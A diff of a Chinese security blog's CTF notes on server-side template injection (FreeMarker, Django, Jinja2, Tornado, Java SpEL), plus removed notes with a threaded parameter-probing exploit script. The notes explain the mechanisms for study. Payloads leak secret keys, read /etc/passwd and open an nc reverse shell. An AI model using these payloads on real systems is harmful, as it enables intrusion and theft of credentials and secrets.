+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>
+<p>上面有格式，由于现阶段没有源码，所以无法分析</p>
+<h4 id="利用框架本身的特性进行攻击"><a href="#利用框架本身的特性进行攻击" class="headerlink" title="利用框架本身的特性进行攻击"></a>利用框架本身的特性进行攻击</h4><h5 id="Django模板"><a href="#Django模板" class="headerlink" title="Django模板"></a>Django模板</h5><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;)</span><br><span class="line">    return HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>
+<p>注入点明显是email，但是如果我们的能力被限制得不能执行命令，但又想获得和user有关的配置信息。我们可以先看一个和user有关的变量request.user，所以我们要在没有应用源码的情况下学会寻找框架本身的属性，看框架有什么属性和类之间的引用</p>
+<p>我们经过查找，Django自带的admin（即后台）的model.py导入了当前网站配置信息，因此我们要通过某种方式找到Django默认应用admin的model，再通过model获取settings对象，从而获取数据库账号密码及web加密密钥，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; </span><br></pre></td></tr></table></figure>
+<h5 id="flask-jinja2"><a href="#flask-jinja2" class="headerlink" title="flask/jinja2"></a>flask/jinja2</h5><p>config是flask模板的一个全局变量，它代表了“当前配置对象（flask.config)”，它是类字典的对象，包含所有应用程序的配置值，它一般包含数据库链接字符串，连接第三方凭证，SECRET_KEY等敏感值，而且config有很多神奇的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from_envvar</span><br><span class="line"></span><br><span class="line">from_object</span><br><span class="line"></span><br><span class="line">from_pyfile</span><br><span class="line"></span><br><span class="line">root_path</span><br></pre></td></tr></table></figure>
+<p>我们可以利用from_pyfile和from_object来命令执行</p>
+<p>from_pyfile</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def from_pyfile(self, filename, silent=False):</span><br><span class="line"></span><br><span class="line">    filename = os.path.join(self.root_path, filename)</span><br><span class="line">    d = types.ModuleType(&#x27;config&#x27;)</span><br><span class="line">    d.__file__ = filename</span><br><span class="line">    try:</span><br><span class="line">        with open(filename) as config_file:</span><br><span class="line">            exec(compile(config_file.read(), filename, &#x27;exec&#x27;), d.__dict__)</span><br><span class="line">    except IOError as e:</span><br><span class="line">        if silent and e.errno in (errno.ENOENT, errno.EISDIR):</span><br><span class="line">            return False</span><br><span class="line">        e.strerror = &#x27;Unable to load configuration file (%s)&#x27; % e.strerror</span><br><span class="line">        raise</span><br><span class="line">    self.from_object(d)</span><br><span class="line">    return True</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>from_object</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def from_object(self, obj):</span><br><span class="line"></span><br><span class="line">    if isinstance(obj, string_types):</span><br><span class="line">        obj = import_string(obj)</span><br><span class="line">    for key in dir(obj):</span><br><span class="line">        if key.isupper():</span><br><span class="line">            self[key] = getattr(obj, key)</span><br></pre></td></tr></table></figure>
+<p>from_pyfile这个方法将传入文件使用compile()这个python内置方法将其编译成字节码（.pyc)，然后放到exec()函数中执行，注意最后一个参数d.__dict__，是指定exec执行的上下文，它后面调用了from_object()方法，然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for key in dir(obj):</span><br><span class="line">           if key.isupper():</span><br><span class="line">               self[key] = getattr(obj, key)</span><br></pre></td></tr></table></figure>
+<p>根据上面代码可知这个方法会遍历obj的dict并且找到大写字母属性，将属性值给self[‘属性名’]，因此我们可以让from_pyfile去读</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line">SHELL=system</span><br></pre></td></tr></table></figure>
+<p>此时我们可以使用config[‘SHELL’]调用system方法</p>
+<p>因此构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/evil&#x27;, &#x27;w&#x27;).write(&#x27;from os import system%0aSHELL = system&#x27;) &#125;&#125;</span><br><span class="line">//写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#x27;/tmp/evil&#x27;) &#125;&#125;</span><br><span class="line">//加载system</span><br><span class="line">&#123;&#123; config[&#x27;SHELL&#x27;](&#x27;nc xxxx xx -e /bin/sh&#x27;) &#125;&#125;</span><br><span class="line">//执行命令反弹SHELL</span><br></pre></td></tr></table></figure>
+
+<h5 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h5><p>我们可以以护网杯的tornado为例，就是通过SSTI获取cookie_secret，通过查找开源源码，我们可以看见代码中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.assertEqual(</span><br><span class="line">	__create_signature_v1(</span><br><span class="line">		hander.application.settings[&quot;cookie_secret&quot;],</span><br><span class="line">		&quot;foo&quot;,</span><br><span class="line">		&quot;12345678&quot;,</span><br><span class="line">		timestamp,</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>
+<p>可知调用hander.application.settings即可获取cookie_secret，但是有过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#x27;()*-/=[\]_|</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用RequestHandler对象，因为我们查官方文档：<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax%EF%BC%8C%E5%8F%91%E7%8E%B0">https://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax，发现</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler：当前RequestHandler对象</span><br></pre></td></tr></table></figure>
+<p>且</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This method is called automatically when the request is finished(当请求完成后自动调用)</span><br><span class="line"></span><br><span class="line">RequestHandler.settings</span><br><span class="line"></span><br><span class="line">An alias for self.application.settings</span><br></pre></td></tr></table></figure>
+<p>因此，我们可以使用handler.settings来访问cookie_secret，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="利用模板语言本身的特性进行攻击"><a href="#利用模板语言本身的特性进行攻击" class="headerlink" title="利用模板语言本身的特性进行攻击"></a>利用模板语言本身的特性进行攻击</h4><h5 id="python语言的模板"><a href="#python语言的模板" class="headerlink" title="python语言的模板"></a>python语言的模板</h5><p>可看：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/</a></p>
+<h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><p>java.lang包是java语言的核心，是java基础类，包含Object类、class类、string类，基本类型包装、基本的数学类等基本的类</p>
+<p>执行命令paload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cat etc/passwd&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+<p>文件操作payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>SSTI详细请看：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig</a>
+ </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-各函数过滤绕过的反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1061,71 +1258,6 @@ while count==1:
 <p>而后和上面一样，用readfile()函数或hightlight_file()函数或show_source()函数来读取文件，要手动设置名为PHPSESSID的cookie，并设置值为flag.php，而后构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start());</span><br></pre></td></tr></table></figure>
 <p>读取flag.php的内容</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-多个php文件寻找参数可利用点" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/30/%E5%A4%9A%E4%B8%AAphp%E6%96%87%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E5%8F%AF%E5%88%A9%E7%94%A8%E7%82%B9/" class="article-date">
-  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/30/%E5%A4%9A%E4%B8%AAphp%E6%96%87%E4%BB%B6%E5%AF%BB%E6%89%BE%E5%8F%82%E6%95%B0%E5%8F%AF%E5%88%A9%E7%94%A8%E7%82%B9/">
-        多个php文件寻找参数可利用点
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="多个php文件寻找参数可利用点"><a href="#多个php文件寻找参数可利用点" class="headerlink" title="多个php文件寻找参数可利用点"></a>多个php文件寻找参数可利用点</h1><p>打开页面，可以看见<a target="_blank" rel="noopener" href="http://www.tar.gz,可知是文件泄露,因此通过构造payload获取源码/">www.tar.gz，可知是文件泄露，因此通过构造payload获取源码</a></p>
-<p>发现源码有上千个文件，且文件中有许多的get和post参数的提交，因此，我们可以通过一个思路来写一个exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先我们要得到各个文件的get和post参数有哪些</span><br><span class="line"></span><br><span class="line">其次我们要利用参数构造payload来传参</span><br><span class="line">get提交payload：http://url/文件名?参数名=echo ~hahaha~;</span><br><span class="line"></span><br><span class="line">最后看返回的信息中是否~hahaha~，如果有，则证明此参数可利用，而后构造cat%20/flag即可读取信息</span><br></pre></td></tr></table></figure>
-
-<p>exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># _*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">requests.adapters.DEFAULT_RETRIES=8</span><br><span class="line">session=requests.Session()</span><br><span class="line">session.keep_alive=False</span><br><span class="line"></span><br><span class="line">sem=threading.Semaphore(30) #设置线程数</span><br><span class="line">url=&quot;http://647c1229-fdeb-4406-9775-cf4e0c33c9d4.node4.buuoj.cn:81/&quot;</span><br><span class="line">path=r&quot;D:\比赛临时文档\buu\src\\&quot;</span><br><span class="line"></span><br><span class="line">rrGET = re.compile(r&quot;\$_GET\[\&#x27;(\w+)\&#x27;\]&quot;) #获取get参数</span><br><span class="line">rrPOST = re.compile(r&quot;\$_POST\[\&#x27;(\w+)\&#x27;\]&quot;) #获取post参数 </span><br><span class="line"></span><br><span class="line">fileNames=os.listdir(path)</span><br><span class="line">local_file=open(&quot;flag.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">def run(fileName):</span><br><span class="line">    with sem:</span><br><span class="line">        file=open(path+fileName,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)</span><br><span class="line">        content=file.read()</span><br><span class="line">        print(&quot;[+]checking:%s&quot;%fileName)</span><br><span class="line">        # get提交</span><br><span class="line">        for i in rrGET.findall(content):</span><br><span class="line">            r = session.get( url + &quot;%s?%s=%s&quot; % (fileName,i,&quot;echo ~h3zh1~;&quot;) )</span><br><span class="line">            if &quot;~h3zh1~&quot; in r.text:</span><br><span class="line">                flag=&quot;You Find it in GET fileName=%s and param=%s\n&quot;%(fileName,i)</span><br><span class="line">                print(flag)</span><br><span class="line">                local_file.write(flag)</span><br><span class="line">        #post提交</span><br><span class="line">        # for i in rrPOST.findall(content):</span><br><span class="line">            # r=session.post(url+fileName,data=&#123;i:&quot;echo ~h3zh1~;&quot;&#125;)</span><br><span class="line">            # if &quot;~h3zh1~&quot; in r.text:</span><br><span class="line">                # flag= &quot;You Find it in GET fileName = %s and param = %s \n&quot; % ( fileName, i )</span><br><span class="line">                # print(flag)</span><br><span class="line">                # local_file.write(flag)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    start_time=time.time()</span><br><span class="line">    print(&quot;[start]程序开始:&quot;+str(start_time))</span><br><span class="line">    thread_list=[]</span><br><span class="line">    for fileName in fileNames:</span><br><span class="line">        t=threading.Thread(target=run,args=(fileName,))</span><br><span class="line">        thread_list.append(t)</span><br><span class="line">    for t in thread_list:</span><br><span class="line">        t.start()</span><br><span class="line">    for t in thread_list:</span><br><span class="line">        t.join()</span><br><span class="line">    end_time=time.time()</span><br><span class="line">    local_file.close()</span><br><span class="line">    print(&quot;[end]程序结束:用时(秒):&quot;+str(end_time-start_time))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>可以搭建环境，url设置为<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/src/%EF%BC%88%E7%9C%8B%E8%87%AA%E5%B7%B1%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%89,%E4%BD%86%E6%98%AFphp%E7%89%88%E6%9C%AC%E8%A6%81%E5%9C%A87%E4%BB%A5%E4%B8%8A%EF%BC%8C%E5%90%A6%E5%88%99%E4%BC%9A%E6%8A%A5%E9%94%99">http://127.0.0.1/sqli/src/（看自己文件的位置）,但是php版本要在7以上，否则会报错</a></p>
 
       
     </div>
